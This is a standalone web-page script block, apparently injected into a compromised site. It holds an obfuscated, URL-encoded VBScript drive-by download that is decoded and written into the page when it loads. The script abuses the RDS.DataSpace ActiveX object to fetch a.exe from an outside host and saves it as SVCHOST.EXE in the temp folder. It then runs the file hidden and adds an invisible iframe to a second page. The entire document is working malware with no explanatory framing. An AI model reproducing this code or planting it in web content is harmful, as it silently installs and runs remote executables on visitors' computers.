<SCRIPT LANGUAGE="Javascript">
<!--
var Words ="%20%3Cscript%20language%3D%22VBScript%22%3E%0D%0A%20%20%20%20on%20error%20resume%20next%0D%0A%20%20%20%20dl%20%3D%20%22http%3A%2F%2Fdrsunbo%2Ego2%2Eicpcn%2Ecom%2Fa%2Eexe%22%0D%0A%20%20%20%20Set%20df%20%3D%20document%2EcreateElement%28%22object%22%29%0D%0A%20%20%20%20df%2EsetAttribute%20%22classid%22%2C%20%22clsid%3ABD96c556%2D65A3%2D11D0%2D983A%2D00C04FC29E36%22%0D%0A%20%20%20%20str%3D%22Microsoft%2EXMLHTTP%22%0D%0A%20%20%20%20Set%20x%20%3D%20df%2ECreateObject%28str%2C%22%22%29%0D%0A%20%20%20%20a0%20%3D%20%22Ad%22%0D%0Aa1%3D%22o%22%0D%0A%20%20%20%20a2%3D%22db%2E%22%0D%0A%20%20%20%20a3%3D%22Str%22%0D%0A%20%20%20%20a4%3D%22eam%22%0D%0A%20%20%20%20str1%3Da0%26a1%26a2%26a3%26a4%0D%0A%20%20%20%20str5%3Dstr1%0D%0A%20%20%20%20set%20S%20%3D%20df%2Ecreateobject%28str5%2C%22%22%29%0D%0A%20%20%20%20S%2Etype%20%3D%201%0D%0A%20%20%20%20str6%3D%22GET%22%0D%0A%20%20%20%20x%2EOpen%20str6%2C%20dl%2C%20False%0D%0A%20%20%20%20x%2ESend%0D%0A%20%20%20%20fname1%3D%22SVCHOST%2EEXE%22%0D%0A%20%20%20%20set%20F%20%3D%20df%2Ecreateobject%28%22Scripting%2EFileSystemObject%22%2C%22%22%29%0D%0A%20%20%20%20set%20tmp%20%3D%20F%2EGetSpecialFolder%282%29%20%0D%0A%20%20%20%20fname1%3D%20F%2EBuildPath%28tmp%2Cfname1%29%0D%0A%20%20%20%20S%2Eopen%0D%0A%20%20%20%20S%2Ewrite%20x%2EresponseBody%0D%0A%20%20%20%20S%2Esavetofile%20fname1%2C2%0D%0A%20%20%20%20S%2Eclose%0D%0A%20%20%20%20set%20Q%20%3D%20df%2Ecreateobject%28%22Shell%2EApplication%22%2C%22%22%29%0D%0A%20%20%20%20Q%2EShellExecute%20fname1%2C%22%22%2C%22%22%2C%22open%22%2C0%0D%0A%20%20%20%20%3C%2Fscript%3E%0D%0A%0D%0A%3Cscript%20type%3D%22text%2Fjscript%22%3E%0D%0Afunction%20init%28%29%20%7B%0D%0Adocument%2Ewrite%28%22%3Ciframe%20src%3Daasa%2Ehtml%20height%3D0%20width%3D0%3E%3C%2Fiframe%3E%22%20%29%3B%0D%0A%7D%0D%0Awindow%2Eonload%20%3D%20init%3B%0D%0A%3C%2Fscript%3E%0D%0A"
function SetNewWords()
{
var NewWords;
NewWords = unescape(Words);
document.write(NewWords);
}
SetNewWords();
// -->
</SCRIPT>